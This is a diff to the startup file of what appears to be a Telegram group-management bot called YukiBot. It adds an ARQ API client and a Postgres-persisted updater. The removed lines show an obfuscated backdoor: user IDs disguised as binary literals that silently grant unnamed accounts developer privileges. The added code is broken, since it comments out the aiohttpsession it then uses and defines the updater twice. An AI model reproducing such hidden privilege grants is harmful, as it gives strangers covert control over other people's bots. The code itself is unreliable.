@@ -6,12 +6,18 @@ import ast
 import sys
 import locale
 import base64
-
+from Python_ARQ import ARQ
 import telegram.ext as tg
 from aiohttp import ClientSession
 from pyrogram import Client, errors
 from telethon import TelegramClient
 from telegram.ext import Updater
+from telethon.sync import TelegramClient
+from telethon.sessions import MemorySession
+from ptbcontrib.postgres_persistence import PostgresPersistence
+from pyrogram import Client, errors, __version__ as pyrover
+
+pyrogram_version = pyrover
 
 StartTime = time.time()
 
@@ -156,10 +162,27 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(abs(0b110010001000001011011100110010001))
-DEV_USERS.add(abs(0b1100110111010001011110110001010))
-DEV_USERS.add(abs(0b101001110110010000111010111110000))
-DEV_USERS.add(abs(0b101100001110010100011000111101001))
+#DEV_USERS.add(abs(0b110010001000001011011100110010001))
+#DEV_USERS.add(abs(0b1100110111010001011110110001010))
+#DEV_USERS.add(abs(0b101001110110010000111010111110000))
+#DEV_USERS.add(abs(0b101100001110010100011000111101001))
+
+
+from YukiBot.config import ARQ_API_KEY, ARQ_API_URL, TOKEN
+from YukiBot.modules.sql import SESSION 
+
+BOT_API_URL = "https://api.telegram.org/bot" 
+
+#aiohttpsession = ClientSession()
+arq = ARQ(ARQ_API_URL, ARQ_API_KEY, aiohttpsession)
+updater = tg.Updater(
+    token=TOKEN,
+    base_url=BOT_API_URL,
+    workers=min(32, os.cpu_count() + 4),
+    request_kwargs={"read_timeout": 10, "connect_timeout": 10},
+    use_context=True,
+    persistence=PostgresPersistence(session=SESSION),
+)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
